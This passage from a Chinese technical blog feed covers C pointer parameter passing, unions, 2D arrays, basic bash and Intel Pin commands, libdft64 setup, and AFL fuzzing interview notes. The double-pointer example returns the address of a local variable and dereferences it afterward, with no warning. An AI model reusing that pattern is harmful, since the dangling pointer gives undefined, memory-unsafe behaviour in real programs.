class=\"hljs-comment\">// 函数定义</span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">printPerson</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">struct</span> Person* p)</span> {<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Name: %s\\n\"</span>, p-&gt;name);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Age: %d\\n\"</span>, p-&gt;age);<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"值传递方式\"><a href=\"#值传递方式\" class=\"headerlink\" title=\"值传递方式\"></a>值传递方式</h2><p>​\t在C语言中，指针可以通过值传递或引用传递的方式进行函数参数的传递。下面给出了两种指针传参的示例代码：</p>\n<ol>\n<li><p>值传递方式：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">changeValue</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> num)</span> {<br>    num = <span class=\"hljs-number\">10</span>; <span class=\"hljs-comment\">// 修改局部变量的值</span><br>}<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-type\">int</span> num = <span class=\"hljs-number\">5</span>;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Before: %d\\n\"</span>, num);<br>    <br>    changeValue(num); <span class=\"hljs-comment\">// 值传递</span><br>    <br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"After: %d\\n\"</span>, num); <span class=\"hljs-comment\">// num的值未改变</span><br>    <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n<p>​\t在这个示例中，<code>changeValue</code>函数通过值传递方式接收一个<code>int</code>类型的参数<code>num</code>。在函数内部，对<code>num</code>进行修改，但这只会影响到函数内部的局部变量，不会改变<code>main</code>函数中的<code>num</code>的值。因此，输出结果为<code>Before: 5</code>和<code>After: 5</code>。</p>\n</li>\n<li><p>引用传递方式：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">changeValue</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span>* ptr)</span> {<br>    *ptr = <span class=\"hljs-number\">10</span>; <span class=\"hljs-comment\">// 修改指针所指向的变量的值</span><br>}<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-type\">int</span> num = <span class=\"hljs-number\">5</span>;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Before: %d\\n\"</span>, num);<br>    <br>    changeValue(&amp;num); <span class=\"hljs-comment\">// 引用传递</span><br>    <br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"After: %d\\n\"</span>, num); <span class=\"hljs-comment\">// num的值已被修改</span><br>    <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n<p>​\t在这个示例中，<code>changeValue</code>函数通过引用传递方式接收一个指向<code>int</code>类型的指针<code>ptr</code>。在函数内部，通过解引用操作<code>*ptr</code>修改了指针所指向的变量的值，因为传递的是指针的地址。这样就可以在函数内部修改<code>main</code>函数中的<code>num</code>的值。输出结果为<code>Before: 5</code>和<code>After: 10</code>。</p>\n</li>\n</ol>\n<p>​\t通过这两个示例，可以看到值传递方式只是传递了变量的副本，函数对副本的修改不会影响原始变量。而引用传递方式通过传递指针的地址，可以直接修改原始变量的值。在实际应用中，可以根据需要选择合适的传参方式。</p>\n<p>​\t<strong>上述内容有一个易错点，就是int*p作为changeValue的参数，指的是传入的ptr是一个地址类型，而调用使用&amp;恰好是取出一个地址进行操作。在做类型定义和类型使用时对于指针的用法是不一样的。</strong></p>\n<ol start=\"3\">\n<li>双重指针的传递方式</li>\n</ol>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">setValue</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span>** ptr)</span> { <span class=\"hljs-comment\">// 这里定义传入的指针是指向指针地址的类型</span><br>    <span class=\"hljs-type\">int</span> value = <span class=\"hljs-number\">10</span>; <br>    *ptr = &amp;value; <span class=\"hljs-comment\">// 将指针指向局部变量value的地址</span><br>}<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-type\">int</span>* p = <span class=\"hljs-literal\">NULL</span>;<br>    setValue(&amp;p); <span class=\"hljs-comment\">// 将p的地址传递给函数</span><br>    <span class=\"hljs-keyword\">if</span> (p != <span class=\"hljs-literal\">NULL</span>) {<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Value: %d\\n\"</span>, *p); <span class=\"hljs-comment\">// 解引用p获取值</span><br>    } <span class=\"hljs-keyword\">else</span> {<br>        <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Invalid pointer\\n\"</span>); <br>    }<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"Union类型的使用\"><a href=\"#Union类型的使用\" class=\"headerlink\" title=\"Union类型的使用\"></a>Union类型的使用</h2><p>​\t在C语言中，联合（Union）是一种特殊的数据结构，<strong>它允许在相同的内存位置存储不同的数据类型。只能同时存储联合中所定义的一个成员的值，如果多个成员的内存大小不相同，则按照尺寸最大的那个变量申请内存</strong>。下面是一个具体的例子，展示了如何使用联合：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><br><span class=\"hljs-comment\">// 定义联合</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">union</span> <span class=\"hljs-title\">Data</span> {</span><br>    <span class=\"hljs-type\">int</span> intValue;<br>    <span class=\"hljs-type\">float</span> floatValue;<br>    <span class=\"hljs-type\">char</span> stringValue[<span class=\"hljs-number\">20</span>];<br>};<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">union</span> <span class=\"hljs-title\">Data</span> <span class=\"hljs-title\">data</span>;</span><br>  <br>    <span class=\"hljs-comment\">// 设置整数值</span><br>    data.intValue = <span class=\"hljs-number\">10</span>;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Integer value: %d\\n\"</span>, data.intValue);<br>  <br>    <span class=\"hljs-comment\">// 设置浮点数值</span><br>    data.floatValue = <span class=\"hljs-number\">3.14</span>;<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Float value: %.2f\\n\"</span>, data.floatValue);<br>  <br>    <span class=\"hljs-comment\">// 设置字符串值</span><br>    <span class=\"hljs-built_in\">strcpy</span>(data.stringValue, <span class=\"hljs-string\">\"Hello\"</span>);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"String value: %s\\n\"</span>, data.stringValue);<br>  <br>    <span class=\"hljs-comment\">// 访问共用体的值</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"After setting string value, Integer value: %d\\n\"</span>, data.intValue);<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"After setting string value, Float value: %.2f\\n\"</span>, data.floatValue);<br>  <br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\t在这个例子中，我们定义了一个联合<code>Data</code>，包含三个成员：<code>intValue</code>（整数类型）、<code>floatValue</code>（浮点数类型）和<code>stringValue</code>（字符串类型）。</p>\n<p>​\t在<code>main</code>函数中，我们声明了一个<code>data</code>联合变量。我们可以通过给联合的不同成员赋值来存储不同类型的数据。在示例中，我们首先设置<code>intValue</code>为10，然后打印出整数值。接下来，我们将<code>floatValue</code>设置为3.14，并打印出浮点数值。最后，我们使用<code>strcpy</code>函数将字符串”Hello”复制到<code>stringValue</code>成员中，并打印出字符串值。</p>\n<p>​\t需要注意的是，联合只能同时存储一个成员的值，因此在设置一个成员的值后，其他成员的值将被覆盖。在示例的最后，我们访问整数值和浮点数值，并发现在设置字符串值后，这两个值被改变了。</p>\n<p>​\t联合在某些情况下可以用于节省内存空间，因为它们共享相同的内存位置。但是要注意使用联合时要小心，确保正确地访问和解释存储在联合中的数据。</p>\n<h2 id=\"二维数组的使用\"><a href=\"#二维数组的使用\" class=\"headerlink\" title=\"二维数组的使用\"></a>二维数组的使用</h2><p>在C语言中，可以使用多种方法创建二维数组。下面是两种常见的创建二维数组的方法：</p>\n<p><strong>方法一：使用静态初始化创建二维数组</strong></p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-comment\">// 创建一个2行3列的二维数组</span><br>    <span class=\"hljs-type\">int</span> matrix[<span class=\"hljs-number\">2</span>][<span class=\"hljs-number\">3</span>] = {<br>        {<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>},   <span class=\"hljs-comment\">// 第一行的元素</span><br>        {<span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">6</span>}    <span class=\"hljs-comment\">// 第二行的元素</span><br>    };<br><br>    <span class=\"hljs-comment\">// 访问二维数组的元素</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Element at matrix[0][0]: %d\\n\"</span>, matrix[<span class=\"hljs-number\">0</span>][<span class=\"hljs-number\">0</span>]); <span class=\"hljs-comment\">// 输出：1</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Element at matrix[1][2]: %d\\n\"</span>, matrix[<span class=\"hljs-number\">1</span>][<span class=\"hljs-number\">2</span>]); <span class=\"hljs-comment\">// 输出：6</span><br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>在这个例子中，我们使用静态初始化的方式创建了一个2行3列的二维数组<code>matrix</code>。通过在花括号内提供初始值来初始化二维数组的每个元素。</p>\n<p><strong>方法二：使用动态内存分配创建二维数组</strong></p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> {<br>    <span class=\"hljs-comment\">// 创建一个2行3列的二维数组</span><br>    <span class=\"hljs-type\">int</span> rows = <span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-type\">int</span> cols = <span class=\"hljs-number\">3</span>;<br><br>    <span class=\"hljs-type\">int</span>** matrix = (<span class=\"hljs-type\">int</span>**)<span class=\"hljs-built_in\">malloc</span>(rows * <span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-type\">int</span>*)); <span class=\"hljs-comment\">// 这里定义指向int*的指针类型</span><br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> i = <span class=\"hljs-number\">0</span>; i &lt; rows; i++) {<br>        matrix[i] = (<span class=\"hljs-type\">int</span>*)<span class=\"hljs-built_in\">malloc</span>(cols * <span class=\"hljs-keyword\">sizeof</span>(<span class=\"hljs-type\">int</span>)); <span class=\"hljs-comment\">// 指向int类型的指针</span><br>    }<br><br>    <span class=\"hljs-comment\">// 给二维数组赋值</span><br>    matrix[<span class=\"hljs-number\">0</span>][<span class=\"hljs-number\">0</span>] = <span class=\"hljs-number\">1</span>;<br>    matrix[<span class=\"hljs-number\">0</span>][<span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">2</span>;<br>    matrix[<span class=\"hljs-number\">0</span>][<span class=\"hljs-number\">2</span>] = <span class=\"hljs-number\">3</span>;<br>    matrix[<span class=\"hljs-number\">1</span>][<span class=\"hljs-number\">0</span>] = <span class=\"hljs-number\">4</span>;<br>    matrix[<span class=\"hljs-number\">1</span>][<span class=\"hljs-number\">1</span>] = <span class=\"hljs-number\">5</span>;<br>    matrix[<span class=\"hljs-number\">1</span>][<span class=\"hljs-number\">2</span>] = <span class=\"hljs-number\">6</span>;<br><br>    <span class=\"hljs-comment\">// 访问二维数组的元素</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Element at matrix[0][0]: %d\\n\"</span>, matrix[<span class=\"hljs-number\">0</span>][<span class=\"hljs-number\">0</span>]); <span class=\"hljs-comment\">// 输出：1</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Element at matrix[1][2]: %d\\n\"</span>, matrix[<span class=\"hljs-number\">1</span>][<span class=\"hljs-number\">2</span>]); <span class=\"hljs-comment\">// 输出：6</span><br><br>    <span class=\"hljs-comment\">// 释放动态分配的内存</span><br>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-type\">int</span> i = <span class=\"hljs-number\">0</span>; i &lt; rows; i++) {<br>        <span class=\"hljs-built_in\">free</span>(matrix[i]);<br>    }<br>    <span class=\"hljs-built_in\">free</span>(matrix);<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\t在这个例子中，我们使用动态内存分配的方式创建了一个2行3列的二维数组<code>matrix</code>。首先，我们使用<code>malloc</code>函数分配了一个指向指针的指针<code>matrix</code>，作为二维数组的行。然后，通过循环为每一行分配内存空间。</p>\n<p>​\t接下来，我们可以像普通的二维数组一样，使用索引操作符<code>[]</code>来访问和赋值二维数组的元素。</p>\n<p>​\t在最后，我们需要记得释放动态分配的内存，以避免内存泄漏。首先，我们使用循环释放每一行的内存，然后再释放指向指针的指针<code>matrix</code>的内存。</p>\n<p>​\t这两种方法分别适用于不同的情况。静态初始化适用于已知大小且不会改变的二维数组，而动态内存分配适用于在程序运行时需要根据具体需求创建大小可变的二维数组。</p>\n<h2 id=\"字符串操作\"><a href=\"#字符串操作\" class=\"headerlink\" title=\"字符串操作\"></a>字符串操作</h2><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309111959759.png\" alt=\"image-20230911195937691\"></p>\n<p>图片来源：<a href=\"https://mp.weixin.qq.com/s/duCnyM53doEt_-OPXK1mDQ\">https://mp.weixin.qq.com/s/duCnyM53doEt_-OPXK1mDQ</a></p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">char</span> greeting[] = <span class=\"hljs-string\">\"Hello\"</span>;<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "C"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/05/bash-chang-yong-zhi-ling/",
            "url": "https://alazymechnaic.github.io/2023/09/05/bash-chang-yong-zhi-ling/",
            "title": "Bash常用指令",
            "date_published": "2023-09-05T07:15:02.000Z",
            "content_html": "<h2 id=\"tar\"><a href=\"#tar\" class=\"headerlink\" title=\"tar\"></a>tar</h2><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 打包操作</span><br>tar -cvf archive.tar file1 file2 ...<br><br><span class=\"hljs-comment\"># -c表示创建打包文件，-v表示显示详细的操作信息，-f指定打包文件的名称。archive.tar是打包文件的名称，file1 file2 ...是要添加到打包文件中的文件或目录的列表。可以根据需要添加多个文件或目录</span><br><br><span class=\"hljs-comment\"># 解包操作</span><br>tar -xvf archive.tar<br>tar -xvf archive.tar -C target_directory<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"du\"><a href=\"#du\" class=\"headerlink\" title=\"du\"></a>du</h2><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 查看文件大小用量</span><br><span class=\"hljs-built_in\">du</span> -sh ./target_file<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"intel-pin\"><a href=\"#intel-pin\" class=\"headerlink\" title=\"intel pin\"></a>intel pin</h2><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 编译可供32位可执行文件使用的pintool</span><br>make obj-ia32/inscount0.so TARGET=ia32<br><span class=\"hljs-comment\"># 编译可供64位可执行文件使用的pintool</span><br>make obj-intel64/inscount0.so TARGET=intel64<br><span class=\"hljs-comment\"># 对目标程序进行插装</span><br>../../../pin -t obj-intel64/inscount0.so -o inscount0.log -- /bin/ls<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "Linux"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/03/libdft/",
            "url": "https://alazymechnaic.github.io/2023/09/03/libdft/",
            "title": "libdft",
            "date_published": "2023-09-03T08:24:26.000Z",
            "content_html": "<h2 id=\"libdft64\"><a href=\"#libdft64\" class=\"headerlink\" title=\"libdft64\"></a>libdft64</h2><p><a href=\"https://github.com/AngoraFuzzer/libdft64\">https://github.com/AngoraFuzzer/libdft64</a></p>\n<h3 id=\"安装踩坑\"><a href=\"#安装踩坑\" class=\"headerlink\" title=\"安装踩坑\"></a>安装踩坑</h3><figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 设置pin</span><br>进入libdft64中执行 ./install_pin.sh<br><span class=\"hljs-comment\"># 手动执行</span><br>Please <span class=\"hljs-built_in\">set</span>:<br><span class=\"hljs-built_in\">export</span> PIN_ROOT=/home/harry/pin-3.20-98437-gf02b61307-gcc-linux<br><span class=\"hljs-comment\"># 编译安装</span><br>make<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/30/afl-ru-men/",
            "url": "https://alazymechnaic.github.io/2023/08/30/afl-ru-men/",
            "title": "AFL入门",
            "date_published": "2023-08-30T08:38:13.000Z",
            "content_html": "<h1 id=\"AFL\"><a href=\"#AFL\" class=\"headerlink\" title=\"AFL ++\"></a>AFL ++</h1><hr>\n<h2 id=\"面试题目相关\"><a href=\"#面试题目相关\" class=\"headerlink\" title=\"面试题目相关\"></a>面试题目相关</h2><h3 id=\"AFL中使用的路径的度量机制是什么？\"><a href=\"#AFL中使用的路径的度量机制是什么？\" class=\"headerlink\" title=\"AFL中使用的路径的度量机制是什么？\"></a>AFL中使用的路径的度量机制是什么？</h3><h3 id=\"针对协议的fuzz主要是做哪些内容？\"><a href=\"#针对协议的fuzz主要是做哪些内容？\" class=\"headerlink\" title=\"针对协议的fuzz主要是做哪些内容？\"></a>针对协议的fuzz主要是做哪些内容？</h3><p>TLSAttacker</p>\n<h3 id=\"为什么针对二级制的工作要比针对源代码的工作更少？\"><a href=\"#为什么针对二级制的工作要比针对源代码的工作更少？\" class=\"headerlink\" title=\"为什么针对二级制的工作要比针对源代码的工作更少？\"></a>为什么针对二级制的工作要比针对源代码的工作更少？</h3><p><strong>原因</strong>：针对二级制的分析开销大，很多基于仿真的方法效率太低；收集目标信息困难；往二进制里面打标签很困难。</p>\n<p><strong>解决办法</strong>：使用处理器追踪的Intel PT，使用触发和过滤功能在指令级别跟踪代码执行。英特尔PT通过记录分支来工作。在运行时，当CPU遇到任何分支指令（如“ je”，“ call”，“ ret”）时，它将记录对该分支采取的操作。这个比较强大，既能够记录用户态又可以记录内核态。</p>\n<h3 id=\"Angr中缓解路径爆炸的策略是什么\"><a href=\"#Angr中缓解路径爆炸的策略是什么\" class=\"headerlink\" title=\"Angr中缓解路径爆炸的策略是什么\"></a>Angr中缓解路径爆炸的策略是什么</h3><ul>\n<li>simProcedure：重写一些可能导致状态爆炸的函数。</li>\n<li>veritesting：动态符号执行和静态符号执行的结合。实现路径归并，DSE生成公式时的负载很高，但公式很容易解出，SSE为语句生成公式，公式生成很容易，但也能覆盖更多路径，但更难解。</li>\n<li>Lazy Solve：跳过不必要的函数</li>\n<li>Symbion：具体执行和符号执行的结合</li>\n<li>代码片段重写，设定好一些固定内存位置，防止其进入会爆炸的路径中。</li>\n<li>Hook：对会产生爆炸的函数进行替换，需要指定要删除的代码片段位置和代码长度，然后用自定义的代码替换。</li>\n</ul>\n<h3 id=\"动态符号执行和静态符号执行的区别\"><a href=\"#动态符号执行和静态符号执行的区别\" class=\"headerlink\" title=\"动态符号执行和静态符号执行的区别\"></a>动态符号执行和静态符号执行的区别</h3><ul>\n<li>动态符号执行是真的会执行目标程序，静态符号执行本身还算做代码扫描。</li>\n<li>静态符号执行主要是收集约束，并且能在一定程度上完成依照符号条件的分支合并，进行剪枝。而动态符号执行则是能够生成路径翻转后的新测试用例。</li>\n<li><strong>选择性符号执行</strong>：选择性符号执行。S2E就是选择性符号执行工具，会在选定区域完成。那么这个时候就可能会出现约束丢失的情况，这种情况下对if</li>\n</ul>\n<h2 id=\"插装相关\"><a href=\"#插装相关\" class=\"headerlink\" title=\"插装相关\"></a>插装相关</h2><h3 id=\"libdft的粒度\"><a href=\"#libdft的粒度\" class=\"headerlink\" title=\"libdft的粒度\"></a>libdft的粒度</h3><p>在粒度上，libdft的污点分析是在指令级别（Instruction-level）进行的。它通过在执行过程中插入代码，对每个指令进行监视和分析。这种粒度较细，可以提供对指令级操作的准确分析和检测，但相应地也会增加插装的开销和运行时性能损失。</p>\n<h3 id=\"插装的粒度有哪些\"><a href=\"#插装的粒度有哪些\" class=\"headerlink\" title=\"插装的粒度有哪些\"></a>插装的粒度有哪些</h3><ol>\n<li>指令级别（Instruction-level）：在指令级别插装中，Pin可以在每个指令执行之前或之后插入代码。这种粒度最细，允许对应用程序的每个指令进行监视、修改或跟踪。指令级别插装提供了对应用程序执行的最详细的控制和观察能力。</li>\n<li>函数级别（Function-level）：在函数级别插装中，Pin可以在每个函数的入口和出口处插入代码。这种粒度较粗，允许对函数的调用和返回进行监视、修改或跟踪。函数级别插装提供了对应用程序控制流的高级观察和干预能力。</li>\n<li>基本块级别（Basic block-level）：在基本块级别插装中，Pin可以在基本块的开头或结尾插入代码。基本块是一段连续的指令序列，没有分支或跳转。基本块级别插装提供了对应用程序中基本块的执行和控制的监视和修改能力。</li>\n<li>指令组级别（Instruction group-level）：在指令组级别插装中，Pin可以在一组相关指令的执行之前或之后插入代码。这种粒度介于指令级别和基本块级别之间，允许在一组指令的执行过程中进行监视、修改或跟踪</li>\n</ol>\n<h2 id=\"模糊测试原理\"><a href=\"#模糊测试原理\" class=\"headerlink\" title=\"模糊测试原理\"></a>模糊测试原理</h2><p>​\tAFL（American Fuzzy Lop）以程序中的代码覆盖率为导向进行模糊测试的工具。由三个基础模块组成，分别是测试用例生成模块、程序执行模块以及异常检测模块。测试用例生成模块包含两种用例生成方式，</p>\n<ul>\n<li>基于生成的Fuzz工具(Generation Based Fuzzer)：用户给定程序输入的格式，生成器自动填充里面的内容。</li>\n<li>基于变异的Fuzz工具(Mutation Based 